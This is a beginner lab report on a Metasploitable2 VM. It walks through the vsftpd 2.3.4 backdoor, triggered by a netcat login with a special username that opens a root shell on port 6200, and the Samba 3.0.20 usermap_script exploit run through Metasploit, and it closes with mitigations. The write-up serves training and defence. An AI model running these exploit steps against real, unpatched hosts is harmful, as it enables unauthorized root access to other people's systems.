# Lab Report: Metasploitable2 ‚Äî vsftpd & Samba Exploitation

---
- Lab Type: Infrastructure Exploitation  
- Skill Level: Beginner  
- Focus: FTP Misconfigurations, Samba Exploitation, Recon  
---
- Author: Eric Graham
- Date: 07/24/2025
- Target: Metaspliotable2 Samba

---

## Table of Contents
- [Objective](#objective)
- [Lab Setup](#lab-setup)
- [Methodology](#methodology)
- [Reconnaissance](#reconnaissance)
- [Exploitation](#exploitation)
  - [vsftpd 2.3.4 Backdoor](#vsftpd-234-backdoor)
  - [Samba 3.0.20 Exploit](#samba-3020-exploit)
- [Post-Exploitation](#post-exploitation)
- [Mitigations & Recommendations](#mitigations--recommendations)
- [References](#references)

---

## üéØ Objective

Practice real-world penetration testing by exploiting known vulnerabilities in Metasploitable2, focusing on `vsftpd 2.3.4` and `Samba 3.0.20`.

---

## üß© Lab Setup

- **Target:** Metasploitable2 VM  
- **Attacker:** Kali Linux VM  
- **Network:** NAT configuration for full connectivity  
- **Tools:** Nmap, Metasploit, Netcat, smbclient, searchsploit

---

## üìå Methodology

This lab follows a streamlined version of the **Penetration Testing Execution Standard (PTES)**:

- **Reconnaissance:** Identify live hosts and running services.
- **Enumeration:** Gather detailed version information to pinpoint vulnerabilities.
- **Exploitation:** Use known CVEs and exploits to gain unauthorized access.
- **Post-Exploitation:** Confirm level of access, demonstrate impact, and outline possible next steps.
- **Reporting:** Document proof-of-concept, supporting evidence, and practical remediation advice.

---

## ‚öîÔ∏è ATT&CK Mapping

Relevant MITRE ATT&CK techniques demonstrated in this lab:

- **T1190 - Exploit Public-Facing Application:** vsftpd 2.3.4 backdoor and Samba 3.0.20 username map script RCE.
- **T1059 - Command and Scripting Interpreter:** Interactive shell access via Netcat and Metasploit.
- **T1078 - Valid Accounts (Conceptual):** Using crafted credentials or misconfigurations to trigger exploitation.

---

## üîç Reconnaissance

Metasploitable2 is an intentionally vulnerable Linux VM used to practice common exploitation techniques.

Download links:  
- [Rapid7 Metasploitable2](https://information.rapid7.com/metasploitable-download.html)  
- [SourceForge](https://sourceforge.net/projects/metasploitable/)

---

### üîé Nmap Scan

I ran a version scan on common ports:

```bash
nmap -sV -p 21,139,445 <target-ip>
````

**Nmap Results:**

| Port | State | Service      | Version      |
| ---- | ----- | ------------ | ------------ |
| 21   | open  | ftp          | vsftpd 2.3.4 |
| 139  | open  | netbios-ssn  | Samba 3.0.20 |
| 445  | open  | microsoft-ds | Samba 3.0.20 |

![Nmap Scan](/screenshots/metasploitable2/nmap_version_port_scan.png)
*Figure 1: Nmap confirms vsftpd 2.3.4 and Samba 3.0.20 open.*

---

## ‚ö° Exploitation

---

### üóùÔ∏è vsftpd 2.3.4 Backdoor Exploit

**About:**
vsftpd 2.3.4 has a malicious backdoor (CVE-2011-2523). Logging in with a username that ends in `:)` opens a hidden shell on port `6200`.

---

**Steps Taken:**

1Ô∏è‚É£ Connect to FTP port:

```bash
nc <target-ip> 21
```

* **Username:** `exploitingYou:)`
* **Password:** `youvebeenhacked`

![vsftpd Trigger](/screenshots/metasploitable2/nc_user_pass_exploit.png)
*Figure 2: Sending special username to trigger the backdoor.*

---

2Ô∏è‚É£ Connect to the hidden backdoor shell on port 6200:

```bash
nc -v <target-ip> 6200
```

3Ô∏è‚É£ Verify root access:

```bash
id
whoami
ls
```

![vsftpd Root Shell](/screenshots/metasploitable2/nc_root_access.png)
*Figure 3: Confirmed root access via backdoor.*

---

### üóùÔ∏è Samba 3.0.20 Exploit (Username Map Script)

**About:**
Samba 3.0.20 has a remote code execution vulnerability (Username Map Script) which allows shell execution.

---

**Steps Taken:**

1Ô∏è‚É£ Started Metasploit:

```bash
msfconsole
```

2Ô∏è‚É£ Ran an SMB version scan to confirm the target version:

```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS <target-ip>
run
```

![SMB Version Scan](/screenshots/metasploitable2/msf_smb_version.png)
*Figure 4: Scanner confirms Samba 3.0.20.*

---

3Ô∏è‚É£ Found an exploit using `searchsploit`:

```bash
searchsploit samba 3.0.20
```

Identified `Username Map Script` exploit.

![Searchsploit Result](/screenshots/metasploitable2/searchsploit_samba_version.png)
*Figure 5: `searchsploit` output.*

---

4Ô∏è‚É£ Loaded the exploit module:

```bash
use exploit/multi/samba/usermap_script
set RHOSTS <target-ip>
exploit
```

5Ô∏è‚É£ Verified shell access:

```bash
whoami
ls
```

![Samba Exploit Shell](/screenshots/metasploitable2/msf_usermap_script_root.png)
*Figure 6: Shell confirmed with root privileges.*

---

## üîì Post-Exploitation

After gaining root-level shells on both services:

* Verified privileges (`whoami`, `id`).
* Listed files and directories.
* Confirmed ability to run arbitrary commands.
* Would pivot to enumerate users, check `/etc/passwd`, search for sensitive configs (`*.conf`), and test lateral movement if this were a real engagement.

---

## Mitigations & Recommendations

* **vsftpd:** Remove version 2.3.4 and install the latest trusted release.
* **Samba:** Patch to a secure version; disable unnecessary Samba shares.
* Enforce least privilege for services.
* Use firewalls to limit service exposure.
* Monitor network traffic for unusual ports and connections.

---

## üìö References

* [Metasploitable2](https://sourceforge.net/projects/metasploitable/)
* [vsftpd 2.3.4 Backdoor (CVE-2011-2523)](https://www.cvedetails.com/cve/CVE-2011-2523/)
* [Metasploit Samba Exploit](https://www.rapid7.com/db/modules/exploit/multi/samba/usermap_script/)

---

~ Eric Graham

